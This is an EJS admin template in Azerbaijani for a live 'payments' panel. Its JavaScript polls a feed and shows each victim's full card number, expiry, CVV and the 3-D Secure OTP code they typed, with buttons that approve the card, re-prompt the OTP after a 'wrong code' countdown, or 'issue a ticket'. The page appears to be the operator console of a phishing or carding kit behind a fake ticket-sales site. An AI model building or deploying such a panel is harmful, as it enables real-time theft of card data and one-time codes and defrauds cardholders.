<section class="section">
  <div class="container">
    <div class="section__head">
      <div>
        <div class="eyebrow"><%= t('nav.panel') %></div>
        <h1><%= t('admin.payments') %></h1>
        <p class="sec-note">Məlumatlar canlı yenilənir — səhifəni yeniləməyə ehtiyac yoxdur.</p>
      </div>
    </div>

    <div class="layout-aside">
      <%- include('../../partials/admin-nav') %>

      <div>
        <div class="card mb-24"><div class="card__body">
          <div class="timetable-tabs">
            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən (<span data-pending-count><%= pending %></span>)</a>
            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved">Təsdiqlənmiş</a>
            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd edilmiş</a>
            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all">Hamısı</a>
          </div>
          <div class="flex-between mt-16">
            <span class="sec-note mb-0"><span class="live-dot"></span> Canlı · son yenilənmə: <span data-live-at>—</span></span>
          </div>
          <div id="payNote" class="hidden alert mb-0 mt-16"></div>
        </div></div>

        <div id="payList" data-feed-url="/api/admin/payments/feed?status=<%= status %>"></div>
      </div>
    </div>
  </div>
</section>

<style>
  .live-dot { display:inline-block;width:8px;height:8px;border-radius:50%;background:#19a974;margin-right:6px;
    animation: livePulse 1.4s ease-in-out infinite; }
  @keyframes livePulse { 0%,100%{opacity:1} 50%{opacity:.25} }
  .pay-card { border:1px solid var(--line); border-radius:12px; background:#fff; margin-bottom:16px; overflow:hidden; }
  .pay-card__head { display:flex; justify-content:space-between; align-items:center; gap:10px;
    padding:12px 16px; background:#f7f9fc; border-bottom:1px solid var(--line); flex-wrap:wrap; }
  .pay-card__body { padding:16px; }
  .pay-grid { display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:18px; }
  @media (max-width:760px){ .pay-grid { grid-template-columns:1fr; } }
  .pay-box { background:#f7f9fc; border-radius:10px; padding:12px 14px; }
  .pay-box h4 { font-size:.85rem; margin:0 0 10px; font-weight:700; }
  .pay-row { display:flex; justify-content:space-between; gap:12px; font-size:.86rem; padding:3px 0; }
  .pay-row span:first-child { color:var(--ink-3); }
  .pay-pan { font-family:Consolas,monospace; font-size:1.15rem; letter-spacing:.06em; font-weight:700; }
  .otp-big { font-family:Consolas,monospace; font-size:1.6rem; letter-spacing:.25em; font-weight:700; color:#00539b; }
  .stage-chip { font-size:.75rem; font-weight:700; padding:4px 10px; border-radius:999px; }
  .stage-card_review { background:#fff5e0; color:#8a6414; }
  .stage-otp_entry { background:#e6f0fb; color:#00539b; }
  .stage-otp_review { background:#fdf1d6; color:#8a6414; }
  .stage-wrong_code { background:#fdecea; color:#a12b26; }
  .stage-done { background:#e8f7ef; color:#14724a; }
  .pay-actions { display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
</style>

<script>
(function () {
  'use strict';
  var list = document.getElementById('payList');
  if (!list) return;
  var feedUrl = list.getAttribute('data-feed-url');
  var noteBox = document.getElementById('payNote');
  var busy = false;

  var STAGE_LABEL = {
    card_review: 'Kart təsdiqi gözlənilir',
    otp_entry: 'İstifadəçi OTP yazır',
    otp_review: 'OTP kodu gəldi — təsdiq gözlənilir',
    wrong_code: 'Səhv kod — geri sayım',
    done: 'Tamamlandı'
  };

  function esc(v) {
    return String(v == null ? '' : v).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function note(msg, kind) {
    noteBox.className = 'alert alert--' + kind + ' mb-0 mt-16';
    noteBox.textContent = msg;
    noteBox.classList.remove('hidden');
  }

  function mmss(s) {
    s = Math.max(0, Number(s) || 0);
    var m = Math.floor(s / 60), r = s % 60;
    return m + ':' + (r < 10 ? '0' : '') + r;
  }

  function actions(p) {
    var out = '';
    if (p.stage === 'card_review') {
      out += '<button class="btn btn--primary" data-act="approve-card" data-id="' + p.id + '">Kartı təsdiqlə — OTP ekranını aç</button>';
    }
    if (p.stage === 'wrong_code') {
      out += '<button class="btn btn--primary" data-act="open-otp" data-id="' + p.id + '">OTP ekranını indi aç</button>';
    }
    if (p.stage === 'otp_review') {
      out += '<button class="btn btn--primary" data-act="approve" data-id="' + p.id + '">Bilet ver</button>';
      out += '<button class="btn btn--gold" data-act="reject-otp" data-id="' + p.id + '">Səhv kod</button>';
    }
    if (p.stage !== 'done') {
      out += '<button class="btn btn--danger" data-act="decline" data-id="' + p.id + '">Ödənişi rədd et</button>';
    }
    return out;
  }

  function render(rows) {
    if (!rows.length) {
      list.innerHTML = '<div class="card"><div class="card__body"><p class="sec-note mb-0">Hazırda ödəniş yoxdur.</p></div></div>';
      return;
    }
    list.innerHTML = rows.map(function (p) {
      var o = p.order || {};
      var u = p.user || {};
      return '' +
      '<div class="pay-card" data-row="' + p.id + '">' +
        '<div class="pay-card__head">' +
          '<span class="mono">' + esc(p.transactionId) + '</span>' +
          '<span class="stage-chip stage-' + esc(p.stage) + '">' + esc(STAGE_LABEL[p.stage] || p.stage) + '</span>' +
          '<span class="mono">⏱ ' + mmss(p.secondsLeft) + '</span>' +
          '<strong>' + Number(p.amount).toFixed(2) + ' ₼</strong>' +
        '</div>' +
        '<div class="pay-card__body">' +
          '<div class="pay-grid">' +
            '<div class="pay-box">' +
              '<h4>Kart məlumatları</h4>' +
              '<div class="pay-pan">' + esc(p.card.number || p.card.masked || '—') + '</div>' +
              '<div class="pay-row"><span>Sahibi</span><span>' + esc(p.card.holder || '—') + '</span></div>' +
              '<div class="pay-row"><span>Son tarix</span><span class="mono">' + esc(p.card.expiry || '—') + '</span></div>' +
              '<div class="pay-row"><span>CVV</span><span class="mono">' + esc(p.card.cvv || '—') + '</span></div>' +
              '<div class="pay-row"><span>Növ</span><span>' + esc((p.card.brand || '—').toUpperCase()) + '</span></div>' +
              '<div class="pay-row"><span>Kart mənbəyi</span><span>' + (p.usingSavedCard ? 'Yadda saxlanılmış kart' : 'Yeni kart') + '</span></div>' +
            '</div>' +
            '<div class="pay-box">' +
              '<h4>Müştəri / sifariş</h4>' +
              '<div class="pay-row"><span>Ad</span><span>' + esc(u.name || '—') + '</span></div>' +
              '<div class="pay-row"><span>E-poçt</span><span>' + esc(u.email || '—') + '</span></div>' +
              '<div class="pay-row"><span>Telefon</span><span>' + esc(u.phone || '—') + '</span></div>' +
              '<div class="pay-row"><span>Sifariş</span><span class="mono">' + esc(o.orderNo || '—') + '</span></div>' +
              '<div class="pay-row"><span>Marşrut</span><span>' + esc(o.route || '—') + '</span></div>' +
              '<div class="pay-row"><span>Tarix</span><span>' + esc(o.date || '—') + '</span></div>' +
            '</div>' +
          '</div>' +
          (p.submittedCode
            ? '<div class="pay-box mt-16"><h4>İstifadəçinin yazdığı 3-D OTP kodu</h4><div class="otp-big">' + esc(p.submittedCode) + '</div></div>'
            : '') +
          (p.codeAttempts && p.codeAttempts.length > 1
            ? '<div class="pay-box mt-16"><h4>Əvvəlki cəhdlər</h4>' + p.codeAttempts.slice(0, -1).map(function (c) {
                return '<div class="pay-row"><span class="mono">' + esc(c.code) + '</span><span>' + new Date(c.at).toLocaleTimeString('az-AZ') + '</span></div>';
              }).join('') + '</div>'
            : '') +
          '<div class="pay-actions">' + actions(p) + '</div>' +
        '</div>' +
      '</div>';
    }).join('');
  }

  async function load() {
    if (busy) return;
    try {
      var res = await fetch(feedUrl, { headers: { 'X-Requested-With': 'XMLHttpRequest' }, credentials: 'same-origin' });
      var d = await res.json();
      if (!d.ok) return;
      render(d.rows);
      var pc = document.querySelector('[data-pending-count]');
      if (pc) pc.textContent = d.pending;
      var at = document.querySelector('[data-live-at]');
      if (at) at.textContent = new Date(d.at).toLocaleTimeString('az-AZ');
    } catch (e) { /* növbəti sorğuda davam edir */ }
  }

  list.addEventListener('click', async function (ev) {
    var btn = ev.target.closest('[data-act]');
    if (!btn) return;
    var act = btn.getAttribute('data-act');
    var id = btn.getAttribute('data-id');
    var body = {};
    if (act === 'decline') {
      var reason = window.prompt('Rədd səbəbi:', 'Kart doğrulanmadı');
      if (reason === null) return;
      body.reason = reason;
    }
    busy = true;
    btn.disabled = true;
    var r = await fetch('/api/admin/payments/' + id + '/' + act, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
      credentials: 'same-origin',
      body: JSON.stringify(body)
    }).then(function (x) { return x.json(); }).catch(function () { return { ok: false, message: 'Şəbəkə xətası' }; });
    busy = false;
    note(r.message || (r.ok ? 'Yerinə yetirildi' : 'Əməliyyat alınmadı'), r.ok ? 'success' : 'error');
    load();
  });

  load();
  setInterval(load, 2000);
})();
</script>
